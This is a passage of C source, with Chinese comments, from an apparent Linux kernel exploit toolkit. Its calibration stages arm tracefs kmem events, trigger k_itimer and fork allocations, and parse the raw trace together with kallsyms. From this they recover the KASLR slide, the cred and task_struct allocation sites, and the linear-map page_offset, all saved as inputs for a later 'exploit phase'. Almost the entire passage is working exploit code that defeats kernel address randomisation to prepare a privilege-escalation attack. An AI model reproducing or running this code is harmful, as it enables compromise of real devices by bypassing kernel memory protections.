			if (recs[i].site != *out_site)
				continue;
			*out_size = recs[i].req;
			break;
		}
		if (out_func && out_func_cap) {
			uint64_t b = 0, l = 0;
			const char *fname = NULL;

			if (sr_find_func(syms, n, *out_site - slide, &b, &l, &fname) == 1 &&
			    fname)
				snprintf(out_func, out_func_cap, "%s", fname);
		}
	}
out:
	free(sites);
	free(recs);
	return found;
}

/*
 * 第二段探针：cred 与 task_struct 的运行期分配点。
 *
 * calib_a 的第一段只造 k_itimer，窗口里不会出现 cred（prepare_creds）或
 * task_struct（dup_task_struct）的分配，所以这两个尺寸的记录在第一段 raw
 * trace 里根本没有 —— 6.18 上 cred_link / task_alloc_link 的运行期调用点
 * 也因此无从谈起（实测 cred=0 task=0，exploit 只能退回「只按尺寸匹配」）。
 *
 * fork() 一次就同时触发两条路径：
 *     copy_process() -> dup_task_struct()  -> task_struct slab 分配
 *     copy_creds()  -> prepare_creds()     -> cred slab 分配
 * 于是一个窗口里两个尺寸都有记录，调用点也就齐了。
 */
static void probe_fork_alloc(void)
{
	int i;

	for (i = 0; i < 3; i++) {
		pid_t pid = fork();
		int status = 0;

		if (pid == 0)
			_exit(0);
		if (pid < 0)
			break;
		waitpid(pid, &status, 0);
	}
}

/*
 * 跑第二段探针并把 cred / task 的运行期调用点落盘。
 *
 * 任何一步失败都只是「不写结果文件」——exploit 阶段会退回「只按尺寸匹配」的
 * 旧行为（实测能跑通，只是匹配精度低），所以这里绝不改成硬失败。
 */
static void calib_a_probe_alloc_sites(const struct kernel_offsets *o,
				      const sr_sym *syms, size_t n,
				      uint64_t slide)
{
	static const char *const CRED_KEYWORDS[] = {
		"prepare_creds", "copy_creds", "commit_creds", "cred",
	};
	static const char *const TASK_KEYWORDS[] = {
		"dup_task_struct", "alloc_task_struct", "copy_process",
		"task_struct", "fork",
	};
	struct raw_sink sink;
	const char *paths[MAX_CPU_RAW];
	char path_buf[MAX_CPU_RAW][64];
	int npaths = 0, cpu;
	uint64_t cred_site = 0, cred_size = 0, task_site = 0, task_size = 0;
	char cred_func[96] = { 0 }, task_func[96] = { 0 };
	int cred_ok = 0, task_ok = 0;
	char buf[128];
	/* task_struct 的 slab object_size 可能比 BTF 的 sizeof 大（THREAD_SIZE 内嵌），
	 * 所以 raw 兜底时用一段尺寸区间去捞，而不是死抠一个数。 */
	uint64_t task_sizes[TASK_SIZE_EXTRA_MAX / 0x40 + 1];
	size_t n_task_sizes = 0;

	if (!o || !syms || !n)
		return;

	calib_disarm();
	set_buffer_kb("16384\n");
	truncate_file(TRACE "/trace");
	if (arm_kmem_event("kmem_cache_alloc")) {
		fprintf(stderr, "[calib_a] warn: cannot re-arm kmem_cache_alloc, skip alloc-site probe\n");
		return;
	}
	kick_rss();
	truncate_file(TRACE "/trace");
	write_file(TRACE "/tracing_on", "1\n");
	probe_fork_alloc();
	write_file(TRACE "/tracing_on", "0\n");
	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");

	/*
	 * 文本 trace 立刻读：它是按 CPU 分的环形缓冲，系统级 kmem_cache_alloc
	 * 流量很大，等 raw 捕获跑完（最多 8 秒）再读，探针窗口的记录早没了。
	 * 文本侧能按 cache 名精确定位（cred / task_struct），比按尺寸猜可靠得多。
	 */
	cred_ok = resolve_alloc_site_by_name("cred", CRED_KEYWORDS,
					     sizeof(CRED_KEYWORDS) / sizeof(CRED_KEYWORDS[0]),
					     syms, n, slide, &cred_site, &cred_size,
					     cred_func, sizeof(cred_func));
	task_ok = resolve_alloc_site_by_name("task_struct", TASK_KEYWORDS,
					      sizeof(TASK_KEYWORDS) / sizeof(TASK_KEYWORDS[0]),
					      syms, n, slide, &task_site, &task_size,
					      task_func, sizeof(task_func));

	/* 文本路径没拿到，才需要抓 raw 兜底 */
	if (!cred_ok || !task_ok) {
		for (cpu = 0; cpu < MAX_CPU_RAW; cpu++) {
			snprintf(path_buf[cpu], sizeof(path_buf[cpu]),
				 TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
			paths[cpu] = path_buf[cpu];
			npaths++;
		}
		if (sink_init(&sink, TOTAL_CAP)) {
			fprintf(stderr, "[calib_a] warn: out of memory for alloc-site probe\n");
			return;
		}
		capture_raw(&sink, paths, npaths, 8, RAW_IDLE_MS, "calib_a");
		fprintf(stdout, "[calib_a] alloc-site probe: raw=%zu bytes\n", sink.len);

		if (!cred_ok && o->cred_size) {
			uint64_t one = o->cred_size;

			cred_ok = resolve_alloc_site(sink.buf, sink.len, syms, n, slide,
						     &one, 1, CRED_KEYWORDS,
						     sizeof(CRED_KEYWORDS) / sizeof(CRED_KEYWORDS[0]),
						     o->cred_link, &cred_site, &cred_size,
						     cred_func, sizeof(cred_func)) == 1;
		}
		if (!task_ok && o->task_struct_size) {
			for (size_t i = 0; i <= TASK_SIZE_EXTRA_MAX / 0x40; i++)
				task_sizes[n_task_sizes++] = o->task_struct_size + i * 0x40;
			task_ok = resolve_alloc_site(sink.buf, sink.len, syms, n, slide,
						     task_sizes, n_task_sizes, TASK_KEYWORDS,
						     sizeof(TASK_KEYWORDS) / sizeof(TASK_KEYWORDS[0]),
						     o->task_alloc_link, &task_site, &task_size,
						     task_func, sizeof(task_func)) == 1;
		}
		free(sink.buf);
	}

	/* --- cred --- */
	if (cred_ok) {
		snprintf(buf, sizeof(buf), "0x%llx", (unsigned long long)cred_site);
		if (write_result_file("sites.cred", buf))
			fprintf(stderr, "[calib_a] warn: cannot write sites.cred\n");
		else
			fprintf(stdout, "[calib_a] cred alloc site=%#llx (func=%s) -> sites.cred\n",
				(unsigned long long)cred_site, cred_func[0] ? cred_func : "?");
	} else {
		fprintf(stderr, "[calib_a] note: cred call site unresolved, exploit matches cred by size only\n");
	}

	/* --- task_struct --- */
	if (task_ok) {
		snprintf(buf, sizeof(buf), "0x%llx", (unsigned long long)task_site);
		if (write_result_file("sites.task", buf))
			fprintf(stderr, "[calib_a] warn: cannot write sites.task\n");
		else
			fprintf(stdout, "[calib_a] task alloc site=%#llx (func=%s) -> sites.task\n",
				(unsigned long long)task_site, task_func[0] ? task_func : "?");
		/*
		 * task_struct 的 slab object_size 与 BTF 的 sizeof(struct task_struct)
		 * 不相等（CONFIG_THREAD_SIZE_IN_TSK 把栈内嵌进去，真机 6.18 实测
		 * 4736 + 1024 = 5760）。profile 里的值只能当下界用，所以把实测值
		 * 落盘，让 exploit 阶段用它做尺寸窗口。
		 */
		if (task_size) {
			snprintf(buf, sizeof(buf), "0x%llx", (unsigned long long)task_size);
			if (write_result_file("task_size.txt", buf))
				fprintf(stderr, "[calib_a] warn: cannot write task_size.txt\n");
			else
				fprintf(stdout, "[calib_a] task_struct object_size=%#llx -> task_size.txt\n",
					(unsigned long long)task_size);
		}
	} else {
		fprintf(stderr, "[calib_a] note: task call site unresolved, exploit matches task by size only\n");
	}
	/*
	 * 校准结果（slide / 各分配点 / task object_size）是后面 exploit 阶段的
	 * 全部输入。落盘一份，避免后续崩溃时这段线索随缓冲区一起丢。
	 */
	calib_sync();
}

/*
 * 6.18 适配：从 raw trace 里取 k_itimer 分配的运行期 call_site，
 * 配合 kallsyms 精确解 KASLR slide，并把各分配点的运行期 call_site 落盘，
 * 供 exploit 阶段当 trace 匹配键（替代写死的 timer_link / cred_link）。
 *
 * 数值 call_site 只能来自 raw trace（文本 trace 的 %pS 没有数值地址）。
 * 解法有两条，都只用「raw 的数值地址 + kallsyms 的未重定位地址」：
 *   a) 文本侧给出符号名与精确函数内偏移 → slide = site - F - off（无任何假设）
 *   b) 2 MiB 对齐法：F = kallsyms 里覆盖 profile timer_link 的符号，
 *      off = (site - F) mod 2 MiB（函数长度 < 2 MiB ⇒ off 唯一），
 *      slide = site - F - off。
 * 优先用 (a)（更精确，能识别 LTO 漂移），失败回退 (b)。
 */
static int calib_a_resolve_via_kallsyms(const struct kernel_offsets *o,
					const sr_sym *syms, size_t n,
					const struct text_site *ts, int nts,
					const uint8_t *raw, size_t raw_len,
					uint64_t *out_slide)
{
	size_t nrec = 0, i;
	struct calib_kmem_rec *recs = NULL;
	uint64_t *sites = NULL;
	struct calib_run top[4];
	size_t n_top = 0;
	uint64_t req = o ? o->kitimer_size : 0;
	uint64_t site = 0, fbase = 0, flen = 0, slide = 0, off = 0;
	const char *fname = NULL;
	char tsym[192];
	uint64_t toff = 0, tslide = 0;

	if (!req || !raw || !raw_len)
		return -1;
	if (!syms || !n)
		return -1;

	/* 1) 数值 call_site：raw trace 里 bytes_req 命中且出现最频的那条 */
	recs = calib_scan_kmem_recs(raw, raw_len, &req, 1, &nrec);
	if (!recs || !nrec) {
		fprintf(stderr, "[calib_a] raw trace has no kmem_cache_alloc with bytes_req=%#llx\n",
			(unsigned long long)req);
		goto fail;
	}
	sites = malloc(nrec * sizeof(uint64_t));
	if (!sites)
		goto fail;
	for (i = 0; i < nrec; i++)
		sites[i] = recs[i].site;
	n_top = calib_top_values(sites, nrec, top, 4);
	free(sites);
	sites = NULL;
	if (!n_top) {
		fprintf(stderr, "[calib_a] no call site collected from raw trace\n");
		goto fail;
	}
	site = top[0].value;
	fprintf(stdout, "[calib_a] raw trace: %zu records with bytes_req=%#llx, dominant call_site=%#llx (%d hits)\n",
		nrec, (unsigned long long)req, (unsigned long long)site, top[0].count);

	/* 2) 优先用文本 trace 的符号名 + 精确偏移（能识别 LTO 漂移） */
	if (text_trace_slide_candidate(syms, n, ts, nts, site, tsym, sizeof(tsym),
				       &toff, &tslide) == 0) {
		slide = tslide;
		fprintf(stdout, "[calib_a] text trace: call_site=%s+0x%llx -> slide=%#llx\n",
			tsym, (unsigned long long)toff, (unsigned long long)slide);
		calib_sync();
	} else {
		/*
		 * 文本候选没自洽：说明探针窗口里最先出现的那批同尺寸记录不是
		 * k_itimer 的分配点（系统级分配会插队）。打印前几个候选便于定位，
		 * 然后退回 2 MiB 对齐法（那条路已经在真机验证过与设备 %pS 输出一致）。
		 */
		for (i = 0; i < (size_t)nts && i < 4; i++)
			fprintf(stdout, "[calib_a] text candidate[%d]: %s+0x%llx name=%s req=%#llx\n",
				(int)i, ts[i].sym, (unsigned long long)ts[i].off,
				ts[i].cache, (unsigned long long)ts[i].req);

		/* 3) 回退：2 MiB 对齐法 */
		if (sr_find_func(syms, n, o->timer_link, &fbase, &flen, &fname) != 1) {
			fprintf(stderr, "[calib_a] kallsyms has no symbol covering timer_link=%#llx\n",
				(unsigned long long)o->timer_link);
			goto fail;
		}
		if (sr_resolve_slide(fbase, flen, site, &slide, &off) != 1) {
			fprintf(stderr, "[calib_a] slide not self-consistent: call_site=%#llx func=%s base=%#llx len=%#llx\n",
				(unsigned long long)site, fname ? fname : "?",
				(unsigned long long)fbase, (unsigned long long)flen);
			goto fail;
		}
		fprintf(stdout, "[calib_a] 2MiB method: call_site=%#llx = %#llx + slide + %#llx (func=%s len=%#llx) -> slide=%#llx\n",
			(unsigned long long)site, (unsigned long long)fbase,
			(unsigned long long)off, fname ? fname : "?",
			(unsigned long long)flen, (unsigned long long)slide);
	}

	/* 4) k_itimer 的运行期调用点落盘：exploit 阶段用它做 trace 匹配键。
	 * cred / task 的调用点由第二段探针负责（见 calib_a_probe_alloc_sites），
	 * 因为第一段窗口里根本没有 cred / task_struct 的分配。 */
	{
		char buf[128];

		snprintf(buf, sizeof(buf), "0x%llx", (unsigned long long)site);
		if (write_result_file("sites.kitimer", buf))
			fprintf(stderr, "[calib_a] warn: cannot write sites.kitimer\n");
	}

	*out_slide = slide;
	free(recs);
	return 0;
fail:
	free(sites);
	free(recs);
	return -1;
}

/* ------------------------------------------------------------------ calib_a */

int calib_a_main(int argc, char **argv)
{
	const struct kernel_offsets *o = kernel_table_get();
	uint64_t sizes[8]; size_t n_sizes = 0;
	if (o->kitimer_size) sizes[n_sizes++] = o->kitimer_size;
	for (size_t ci = 0; ci < sizeof(KITIMER_SIZE_DEFAULTS)/sizeof(KITIMER_SIZE_DEFAULTS[0]); ci++) {
		uint64_t d = KITIMER_SIZE_DEFAULTS[ci]; int dup = 0;
		for (size_t j = 0; j < n_sizes; j++) if (sizes[j] == d) { dup = 1; break; }
		if (!dup) sizes[n_sizes++] = d;
	}
	uint64_t timer_link = o ? o->timer_link : 0;
	struct raw_sink sink;
	const char *paths[MAX_CPU_RAW];
	char path_buf[MAX_CPU_RAW][64];
	int npaths = 0, cpu;
	uint64_t *sites = NULL;
	size_t n_sites = 0;
	struct calib_run top[8];
	size_t n_top, i;
	char n_str[32], hold_str[32];
	char *probe_argv[4];
	int rc = 1;
	uint64_t slide = 0;
	int found = 0;
	struct text_site text_sites[TEXT_SITE_MAX];
	int n_text = 0;

	if (!timer_link) {
		fprintf(stderr, "[calib_a] error: profile missing timer_link\n");
		return 1;
	}

	snprintf(n_str, sizeof(n_str), "%d", argc > 1 ? atoi(argv[1]) : 2048);
	snprintf(hold_str, sizeof(hold_str), "%d", argc > 2 ? atoi(argv[2]) : 2);

	fprintf(stdout, "[calib_a] collecting call sites (timer_link=%#llx, probe %s / hold %ss)\n",
		(unsigned long long)timer_link, n_str, hold_str);

	calib_disarm();
	set_buffer_kb("16384\n");
	truncate_file(TRACE "/trace");
	if (arm_kmem_event("kmem_cache_alloc")) {
		fprintf(stderr, "[calib_a] error: cannot arm kmem_cache_alloc (tracefs not writable?)\n");
		calib_disarm();
		return 1;
	}
	if (write_file(TRACE "/events/kmem/rss_stat/enable", "1\n")) {
		fprintf(stderr, "[calib_a] error: cannot enable kmem/rss_stat\n");
		calib_disarm();
		return 1;
	}
	kick_rss();
	truncate_file(TRACE "/trace");
	write_file(TRACE "/tracing_on", "1\n");

	probe_argv[0] = (char *)"timer_probe";
	probe_argv[1] = n_str;
	probe_argv[2] = hold_str;
	probe_argv[3] = NULL;
	timer_probe_main(3, probe_argv);

	write_file(TRACE "/tracing_on", "0\n");
	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");

	/*
	 * 文本 trace 必须**立刻**采集：它是按 CPU 分的环形缓冲，系统级的
	 * kmem_cache_alloc 流量很大，等下面 raw 捕获跑完（最多 8 秒）再读，
	 * 探针窗口的记录早被冲掉了 —— 这就是之前「文本 trace 交叉验证在真机
	 * 从未触发」的原因。
	 */
	n_text = text_trace_collect_sites(NULL, o ? o->kitimer_size : 0,
					  text_sites, TEXT_SITE_MAX);
	if (n_text)
		fprintf(stdout, "[calib_a] text trace: %d k_itimer site(s) captured\n",
			n_text);

	/* k_itimer 的分配可能发生在任意 CPU 上（probe 线程会迁移），
	 * 所以必须把所有 per-CPU raw pipe 都抓，不能只抓 cpu0 ——
	 * 只抓 cpu0 时常常一条 k_itimer 记录都捞不到。
	 * （calib_b 一直就是这么做的，calib_a 这里以前漏了。） */
	for (cpu = 0; cpu < MAX_CPU_RAW; cpu++) {
		snprintf(path_buf[cpu], sizeof(path_buf[cpu]),
			 TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
		paths[cpu] = path_buf[cpu];
		npaths++;
	}
	if (sink_init(&sink, TOTAL_CAP)) {
		fprintf(stderr, "[calib_a] error: out of memory\n");
		return 1;
	}
	capture_raw(&sink, paths, npaths, 8, RAW_IDLE_MS, "calib_a");
	fprintf(stdout, "[calib_a] captured raw=%zu bytes\n", sink.len);

	/* 6.18 适配：优先用 kallsyms 精确解 slide（不依赖写死锚点）；
	 * 失败再退回旧的「最频 call_site - TIMER_LINK」法。 */
	{
		uint64_t slide_new = 0;
		sr_sym *syms = NULL;
		size_t nsyms = 0;
		int have_syms = (load_kallsyms_map(&syms, &nsyms) == 0);

		if (have_syms)
			fprintf(stdout, "[calib_a] kallsyms map: %zu symbols\n", nsyms);
		else
			fprintf(stderr, "[calib_a] note: no kallsyms map, fall back to legacy slide anchor\n");
		calib_sync();

		if (have_syms &&
		    calib_a_resolve_via_kallsyms(o, syms, nsyms, text_sites, n_text,
						 sink.buf, sink.len, &slide_new) == 0) {
			char nbuf[64];

			snprintf(nbuf, sizeof(nbuf), "0x%llx", (unsigned long long)slide_new);
			if (!write_result_file("slide.txt", nbuf)) {
				fprintf(stdout, "[calib_a] slide = %#llx  _text = %#llx\n",
					(unsigned long long)slide_new,
					(unsigned long long)(UINT64_C(0xFFFFFFC080000000) + slide_new));
				fprintf(stdout, "C98260_SLIDE=0x%llx\n", (unsigned long long)slide_new);
				/* 第二段探针：cred / task 的运行期调用点 */
				calib_a_probe_alloc_sites(o, syms, nsyms, slide_new);
				fprintf(stdout, "[calib_a] done\n");
				rc = 0;
				goto out;
			}
		}
	}

	sites = calib_scan_kitimer(sink.buf, sink.len, 0, 1, 0, sizes, n_sizes, &n_sites);
	if (!sites || !n_sites) {
		fprintf(stdout, "[calib_a] error: no k_itimer records found (multi-size probe)\n");
		goto out;
	}

	n_top = calib_top_values(sites, n_sites, top, 8);
	fprintf(stdout, "[calib_a] candidate call sites: %zu\n", n_top);
	for (i = 0; i < n_top; i++) {
		uint64_t s = top[i].value - timer_link;
		int ok = (top[i].value >= timer_link) &&
			 (s < (UINT64_C(1) << 42));
		if (ok && (s % SCAN_STEP))
			fprintf(stdout, "[calib_a] note: slide not 2MiB-aligned (%#llx), keep as candidate\n",
				(unsigned long long)s);
		fprintf(stdout, "[calib_a]   site=%#llx count=%d slide=%#llx%s\n",
			(unsigned long long)top[i].value, top[i].count,
			(unsigned long long)s, ok ? "" : " (implausible)");
		if (ok && !found) {
			slide = s;
			found = 1;
			if (top[i].count < 64)
				fprintf(stdout, "[calib_a] warn: weak support samples (%d), result may be unstable\n",
					top[i].count);
		}
	}

	if (!found) {
		fprintf(stderr, "[calib_a] error: no plausible slide candidate\n");
		goto out;
	}

	fprintf(stdout, "[calib_a] slide = %#llx  _text = %#llx\n",
		(unsigned long long)slide,
		(unsigned long long)(UINT64_C(0xFFFFFFC080000000) + slide));
	calib_sync();
	{
		char buf[64];
		snprintf(buf, sizeof(buf), "0x%llx", (unsigned long long)slide);
		if (write_result_file("slide.txt", buf))
			goto out;
	}
	fprintf(stdout, "C98260_SLIDE=0x%llx\n", (unsigned long long)slide);
	rc = 0;

out:
	free(sites);
	free(sink.buf);
	if (rc == 0)
		fprintf(stdout, "[calib_a] done\n");
	return rc;
}

/* ------------------------------------------------------------------ calib_b */

/* extract mm_page_alloc order=1 PFNs from text trace (equiv: calib.sh grep+sed) */
static int collect_order1_pfns(uint64_t **out, size_t *out_n)
{
	FILE *f = fopen(TRACE "/trace", "r");
	char line[8192];
	size_t cap = 4096, n = 0;
	uint64_t *arr;

	*out = NULL;
	*out_n = 0;
	if (!f) {
		fprintf(stderr, "[calib_b] error: cannot read " TRACE "/trace\n");
		return -1;
	}
	arr = malloc(cap * sizeof(*arr));
	if (!arr) {
		fclose(f);
		return -1;
	}
	while (fgets(line, sizeof(line), f)) {
		char *p;
		unsigned long long v = 0;
		if (!strstr(line, "mm_page_alloc"))
			continue;
		p = strstr(line, "order=1");
		if (!p)
			continue;
		/* exclude false matches like order=10.. (aligns with reference impl grep "order=1" semantics) */
		if (p[7] >= '0' && p[7] <= '9')
			continue;
		p = strstr(line, "pfn=");
		if (!p)
			continue;
		if (sscanf(p + 4, "%llx", &v) != 1)
			continue;
		if (n == cap) {
			uint64_t *q = realloc(arr, (cap * 2) * sizeof(*arr));
			if (!q)
				break;
			cap *= 2;
			arr = q;
		}
		arr[n++] = (uint64_t)v;
	}
	fclose(f);
	qsort(arr, n, sizeof(*arr), cmp_u64_local);
	*out = arr;
	*out_n = n;
	return 0;
}

/* 读 $CVE98260_HOME 下一个 "0x..." 结果文件（calib_a 落盘的运行期调用点）。 */
static uint64_t read_result_u64(const char *name)
{
	char path[512];
	char buf[64];
	unsigned long long v = 0;
	FILE *f;

	snprintf(path, sizeof(path), "%s/%s", calib_home(), name);
	f = fopen(path, "r");
	if (!f)
		return 0;
	if (fgets(buf, sizeof(buf), f))
		sscanf(buf, "0x%llx", &v);
	fclose(f);
	return (uint64_t)v;
}

/* resolve slide: prefer --slide, then env CVE98260_SLIDE, then $HOME/slide.txt */
static int resolve_slide(int argc, char **argv, uint64_t *out)
{
	int i;
	const char *env = getenv("CVE98260_SLIDE");

	for (i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--slide") && i + 1 < argc) {
			*out = strtoull(argv[++i], NULL, 0);
			return 0;
		}
	}
	if (env && *env) {
		*out = strtoull(env, NULL, 0);
		return 0;
	}
	{
		char path[512];
		FILE *f;
		snprintf(path, sizeof(path), "%s/slide.txt", calib_home());
		f = fopen(path, "r");
		if (f) {
			unsigned long long v = 0;
			if (fscanf(f, "%llx", &v) == 1) {
				fclose(f);
				*out = (uint64_t)v;
				return 0;
			}
			fclose(f);
		}
	}
	return -1;
}

int calib_b_main(int argc, char **argv)
{
	const struct kernel_offsets *o = kernel_table_get();
	uint64_t sizes[8]; size_t n_sizes = 0;
	if (o->kitimer_size) sizes[n_sizes++] = o->kitimer_size;
	for (size_t ci = 0; ci < sizeof(KITIMER_SIZE_DEFAULTS)/sizeof(KITIMER_SIZE_DEFAULTS[0]); ci++) {
		uint64_t d = KITIMER_SIZE_DEFAULTS[ci]; int dup = 0;
		for (size_t j = 0; j < n_sizes; j++) if (sizes[j] == d) { dup = 1; break; }
		if (!dup) sizes[n_sizes++] = d;
	}
	uint64_t timer_link = o ? o->timer_link : 0;
	uint64_t page_offset_default = o ? o->page_offset
					 : UINT64_C(0xffffff7f80000000);
	uint64_t slide = 0, site_link, best_base = 0, best_score = 0;
	struct raw_sink sink;
	const char *paths[MAX_CPU_RAW];
	char path_buf[MAX_CPU_RAW][64];
	int npaths = 0, cpu;
	uint64_t *ptrs = NULL, *pfns = NULL, *pages = NULL;
	size_t n_ptrs = 0, n_pfns = 0, n_pages = 0;
	char n_str[32], hold_str[32];
	char *probe_argv[4];
	int i;

	if (!timer_link) {
		fprintf(stderr, "[calib_b] error: profile missing timer_link\n");
		return 1;
	}
	if (resolve_slide(argc, argv, &slide)) {
		fprintf(stderr, "[calib_b] error: slide missing (run calibrate-a or pass --slide)\n");
		return 1;
	}
	/* 6.18：calib_a 已把**实测**的运行期调用点落盘到 sites.kitimer，
	 * 优先用它做 trace 匹配键。写死的 timer_link 在 6.18 上是函数基址而不是
	 * 调用点（do_timer_create+0xe8 vs 基址），直接用它过滤会一条都匹配不到。 */
	{
		uint64_t rt_site = read_result_u64("sites.kitimer");

		site_link = rt_site ? rt_site : (timer_link + slide);
		fprintf(stdout, "[calib_b] slide=%#llx call site=%#llx%s\n",
			(unsigned long long)slide, (unsigned long long)site_link,
			read_result_u64("sites.kitimer") ? " (from sites.kitimer)" : " (from timer_link+slide)");
	}

	snprintf(n_str, sizeof(n_str), "%d", 4096);
	snprintf(hold_str, sizeof(hold_str), "%d", 1);
	for (i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--probe-n") && i + 1 < argc)
			snprintf(n_str, sizeof(n_str), "%d", atoi(argv[++i]));
		else if (!strcmp(argv[i], "--probe-hold") && i + 1 < argc)
			snprintf(hold_str, sizeof(hold_str), "%d", atoi(argv[++i]));
	}

	calib_disarm();
	set_buffer_kb("65536\n");
	truncate_file(TRACE "/trace");
	if (arm_kmem_event("kmem_cache_alloc") ||
	    arm_kmem_event("mm_page_alloc")) {
		fprintf(stderr, "[calib_b] error: cannot arm kmem_cache_alloc / mm_page_alloc\n");
		return 1;
	}
	if (write_file(TRACE "/events/kmem/rss_stat/enable", "1\n")) {
		fprintf(stderr, "[calib_b] error: cannot enable kmem/rss_stat\n");
		calib_disarm();
		return 1;
	}
	kick_rss();
	truncate_file(TRACE "/trace");
	write_file(TRACE "/tracing_on", "1\n");

	probe_argv[0] = (char *)"timer_probe";
	probe_argv[1] = n_str;
	probe_argv[2] = hold_str;
	probe_argv[3] = NULL;
	timer_probe_main(3, probe_argv);

	write_file(TRACE "/tracing_on", "0\n");
	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");

	/* order=1 PFNs come from text trace (pfn is not hashed there) */
	if (collect_order1_pfns(&pfns, &n_pfns)) {
		calib_disarm();
		return 1;
	}
	fprintf(stdout, "[calib_b] order1_pfns=%zu\n", n_pfns);

	/* k_itimer virtual addresses come from each CPU's raw pipe, captured concurrently (probe may run on any CPU) */
	for (cpu = 0; cpu < MAX_CPU_RAW; cpu++) {
		snprintf(path_buf[cpu], sizeof(path_buf[cpu]),
			 TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
		paths[cpu] = path_buf[cpu];
		npaths++;
	}
	if (sink_init(&sink, TOTAL_CAP)) {
		fprintf(stderr, "[calib_b] error: out of memory\n");
		free(pfns);
		calib_disarm();
		return 1;
	}
	capture_raw(&sink, paths, npaths, 8, RAW_IDLE_MS, "calib_b");
	calib_disarm();
	fprintf(stdout, "[calib_b] raw=%zu bytes\n", sink.len);

	ptrs = calib_scan_kitimer(sink.buf, sink.len, site_link, 0, 1, sizes, n_sizes, &n_ptrs);
	if (!ptrs || !n_ptrs) {
		fprintf(stderr, "[calib_b] error: no matching k_itimer records (slide may be wrong)\n");
		goto fallback;
	}

	/* dedupe + take slab pages aligned to 8K (order-1 = 2 pages = 8KB) */
	pages = malloc(n_ptrs * sizeof(uint64_t));
	if (!pages)
		goto fallback;
	n_pages = calib_pages_from_ptrs(ptrs, n_ptrs, pages);
	fprintf(stdout, "[calib_b] k_itimer=%zu slab_pages=%zu\n", n_ptrs, n_pages);

	if (!n_pages || !n_pfns) {
		fprintf(stderr, "[calib_b] error: insufficient samples\n");
		goto fallback;
	}

	best_base = calib_solve_lmap(pages, n_pages, pfns, n_pfns, &best_score);
	if (!best_score) {
		fprintf(stderr, "[calib_b] error: no candidate base hits the order-1 set\n");
		goto fallback;
	}

	fprintf(stdout, "[calib_b] page_offset = %#llx (score=%llu/%zu)\n",
		(unsigned long long)best_base, (unsigned long long)best_score,
		n_pages);
	{
		char buf[64], score[64];
		snprintf(buf, sizeof(buf), "0x%llx", (unsigned long long)best_base);
		snprintf(score, sizeof(score), "%llu/%zu",
			 (unsigned long long)best_score, n_pages);
		if (write_result_file("page_offset.txt", buf) ||
		    write_result_file("page_offset.score", score))
			goto fallback;
	}
	fprintf(stdout, "C98260_PAGE_OFFSET=0x%llx\n", (unsigned long long)best_base);
	free(pages);
	free(ptrs);
	free(pfns);
	free(sink.buf);
	fprintf(stdout, "[calib_b] done\n");
	return 0;

fallback:
	{
		char buf[64];
		snprintf(buf, sizeof(buf), "0x%llx",
			 (unsigned long long)page_offset_default);
		fprintf(stdout, "[calib_b] warn: fallback to profile default page_offset=%s\n", buf);
		write_result_file("page_offset.txt", buf);
		write_result_file("page_offset.score", "fallback");
		fprintf(stdout, "C98260_PAGE_OFFSET=%s\n", buf);
	}
	free(pages);
	free(ptrs);
	free(pfns);
	free(sink.buf);
	return 1;
}
